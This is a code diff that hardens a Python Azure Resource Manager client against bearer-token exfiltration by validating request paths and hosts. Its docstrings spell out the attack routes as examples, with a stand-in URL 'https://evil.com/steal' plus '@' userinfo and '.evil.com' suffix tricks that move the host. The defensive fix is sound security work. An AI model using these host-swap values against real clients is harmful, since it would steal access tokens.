@@ -9,15 +9,69 @@ selector works even for pasted-token connections.
 from __future__ import annotations
 
 import json
+import re
 from datetime import datetime, timezone
 from typing import Any
 
 import httpx
 
 _ARM = "https://management.azure.com"
+_ARM_HOST = "management.azure.com"
+
+# Whitespace, C0/C7F control characters, and backslash. CR/LF are the request-splitting
+# ones; backslash because several URL parsers fold it to "/" and httpx does not.
+_UNSAFE_PATH_CHARS = re.compile(r"[\x00-\x20\x7f\\]")
+
+
+def arm_path_error(path: str) -> str | None:
+    """Return why ``path`` is unsafe as an ARM-relative path, or None when it is fine.
+
+    Every helper below attaches the connection's ARM bearer token, so a value that can
+    move the HOST is a token-exfiltration primitive rather than merely a wrong URL. Two
+    distinct routes, both confirmed against httpx rather than assumed:
+
+      * httpx lets an ABSOLUTE url override ``base_url`` completely --
+        ``client(base_url=_ARM).build_request("GET", "https://evil.com/steal")`` resolves
+        to ``https://evil.com/steal``, so a caller-supplied path reaches any host.
+      * callers that build ``f"https://management.azure.com{resource_id}"`` hand the host
+        to anyone who can begin the value with ``@`` (userinfo, resolves to ``evil.com``)
+        or ``.`` (resolves to ``management.azure.com.evil.com`` -- a registrable domain).
+
+    Requiring exactly one leading "/" closes both. Real ARM resource ids already start
+    with "/subscriptions/" or "/providers/", so nothing legitimate is rejected.
+    """
+    if not isinstance(path, str) or not path:
+        return "path must be a non-empty string"
+    if not path.startswith("/"):
+        return "path must start with '/'; absolute urls and host-relative values are refused"
+    if path.startswith("//"):
+        return "path must not start with '//' (protocol-relative)"
+    if _UNSAFE_PATH_CHARS.search(path):
+        return "path contains whitespace, a control character, or a backslash"
+    return None
+
+
+def arm_url_error(url: str) -> str | None:
+    """Return why ``url`` is not a safe ARM target, or None when it is fine.
+
+    Compares the PARSED host rather than a string prefix, so neither
+    ``https://management.azure.com@evil.com/`` nor ``https://management.azure.com.evil.com/``
+    passes. https is required because the request carries a bearer token.
+    """
+    try:
+        parsed = httpx.URL(url)
+    except (httpx.InvalidURL, TypeError, ValueError):
+        return "malformed url"
+    if parsed.scheme != "https":
+        return "url must use https; the request carries a bearer token"
+    if (parsed.host or "").lower() != _ARM_HOST:
+        return f"refusing to send an ARM token to host {parsed.host or '(none)'!r}"
+    return None
 
 
 async def _get(token: str, path: str, params: dict[str, str]) -> tuple[Any, str | None]:
+    if bad := arm_path_error(path):
+        return None, f"ARM request refused: {bad}"
     headers = {"Authorization": f"Bearer {token}"}
     try:
         async with httpx.AsyncClient(timeout=30, base_url=_ARM) as client:
@@ -34,6 +88,8 @@ async def _get(token: str, path: str, params: dict[str, str]) -> tuple[Any, str 
 
 
 async def _post(token: str, path: str, params: dict[str, str], body: dict[str, Any] | None = None) -> tuple[Any, str | None]:
+    if bad := arm_path_error(path):
+        return None, f"ARM request refused: {bad}"
     headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
     try:
         async with httpx.AsyncClient(timeout=30, base_url=_ARM) as client:
@@ -636,6 +692,8 @@ async def arm_rest(
     when the url targets ``management.azure.com``). Returns ``(json_text, error)`` so callers
     that previously parsed ``az rest`` stdout consume it unchanged. Accepts 200/201/202 (LRO
     submit) and returns whatever body came back."""
+    if bad := arm_url_error(url):
+        return "", f"ARM request refused: {bad}"
     headers = {"Authorization": f"Bearer {token}"}
     if body is not None:
         headers["Content-Type"] = "application/json"
@@ -673,6 +731,8 @@ async def arm_write(
     DELETE). ``path`` is a management.azure.com-relative path; ``api_version`` is appended as a
     query param when provided. Surfaces the ARM error body so the UI can show why a write failed.
     Never raises."""
+    if bad := arm_path_error(path):
+        return None, f"ARM request refused: {bad}", 0
     headers = {"Authorization": f"Bearer {token}"}
     if body is not None:
         headers["Content-Type"] = "application/json"
